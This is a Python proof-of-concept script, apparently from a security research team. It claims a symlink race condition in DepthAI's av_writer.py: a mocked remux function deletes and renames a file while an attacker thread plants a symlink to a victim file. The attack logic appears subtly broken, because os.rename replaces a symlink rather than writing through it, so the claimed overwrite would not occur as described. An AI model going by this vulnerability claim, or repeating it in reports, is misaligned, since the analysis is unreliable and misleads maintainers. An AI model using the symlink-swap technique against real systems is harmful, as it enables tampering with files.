#!/usr/bin/env python3
"""
DepthAI Security Analysis - Race Condition PoC

This script demonstrates a potential race condition vulnerability in the
av_writer.py file of the DepthAI project.

DISCLAIMER: This PoC is for educational and security research purposes only.
Do not use this code for malicious purposes.

Author: Manus AI Security Research Team
Date: October 2025
"""

import os
import threading
import time
from pathlib import Path

class MockAvWriter:
    """
    Mock implementation of the vulnerable av_writer.py functionality
    for demonstration purposes.
    """
    
    def __init__(self, fourcc="h264"):
        self._fourcc = fourcc

    def remux_h264_video(self, input_file: str) -> None:
        """
        Simulates the vulnerable remux_h264_video function from av_writer.py
        
        Args:
            input_file: Path to the H.264 file to be remuxed
        """
        # Simulate remuxing process
        mp4_file = str(Path(input_file).with_suffix(".mp4"))
        if input_file == mp4_file:
            mp4_file = str(Path(input_file).with_suffix(".remuxed.mp4"))

        # Create the new MP4 file
        with open(mp4_file, "w") as f:
            f.write("This is the remuxed video content.")

        print(f"[MAIN] Created remuxed file: {mp4_file}")

        # VULNERABLE SECTION: Race condition window
        print(f"[MAIN] Removing original file: {input_file}")
        os.remove(input_file)
        
        # This sleep simulates the time window where the race condition can occur
        time.sleep(0.1)
        
        try:
            print(f"[MAIN] Renaming {mp4_file} to {input_file}")
            os.rename(mp4_file, input_file)
            print(f"[MAIN] Successfully renamed file")
        except Exception as e:
            print(f"[MAIN] Error during rename: {e}")


def race_condition_attack(target_file, victim_file):
    """
    Simulates an attacker thread that attempts to exploit the race condition
    
    Args:
        target_file: The file that will be deleted and recreated
        victim_file: The file that the attacker wants to overwrite
    """
    # Wait for the target file to exist
    while not os.path.exists(target_file):
        time.sleep(0.001)

    print(f"[ATTACKER] Target file {target_file} detected")

    # Wait for the target file to be deleted
    while os.path.exists(target_file):
        time.sleep(0.001)

    print(f"[ATTACKER] Target file deleted, creating symlink attack")
    
    try:
        # Create symbolic link to victim file
        os.symlink(victim_file, target_file)
        print(f"[ATTACKER] Symlink created: {target_file} -> {victim_file}")
        return True
    except Exception as e:
        print(f"[ATTACKER] Failed to create symlink: {e}")
        return False


def main():
    """
    Main function that demonstrates the race condition vulnerability
    """
    print("=== DepthAI Race Condition PoC ===\n")
    
    # Setup test environment
    test_h264_file = "test_video.h264"
    victim_file = "/tmp/sensitive_file.txt"
    
    # Cleanup from previous runs
    for file_path in [test_h264_file, victim_file]:
        if os.path.exists(file_path) or os.path.islink(file_path):
            os.remove(file_path)

    # Create initial files
    with open(test_h264_file, "w") as f:
        f.write("Original H.264 video data")
    
    with open(victim_file, "w") as f:
        f.write("SENSITIVE: This file should not be overwritten!")

    print(f"Created test files:")
    print(f"  - H.264 file: {test_h264_file}")
    print(f"  - Victim file: {victim_file}")
    print()

    # Read original victim file content
    with open(victim_file, "r") as f:
        original_content = f.read()
    print(f"Original victim file content: {original_content}")
    print()

    # Start the attacker thread
    attacker_thread = threading.Thread(
        target=race_condition_attack, 
        args=(test_h264_file, victim_file)
    )
    attacker_thread.start()

    # Start the vulnerable process
    print("[MAIN] Starting vulnerable remux process...")
    writer = MockAvWriter()
    writer.remux_h264_video(test_h264_file)

    # Wait for attacker thread to complete
    attacker_thread.join()

    # Check if the attack was successful
    print("\n=== RESULTS ===")
    
    try:
        with open(victim_file, "r") as f:
            final_content = f.read()
        
        if final_content != original_content:
            print("🚨 ATTACK SUCCESSFUL!")
            print(f"Victim file has been overwritten!")
            print(f"New content: {final_content}")
        else:
            print("✅ Attack failed - victim file unchanged")
            print(f"Content: {final_content}")
            
    except Exception as e:
        print(f"Error reading victim file: {e}")

    # Cleanup
    for file_path in [test_h264_file, victim_file]:
        if os.path.exists(file_path) or os.path.islink(file_path):
            os.remove(file_path)


if __name__ == "__main__":
    main()
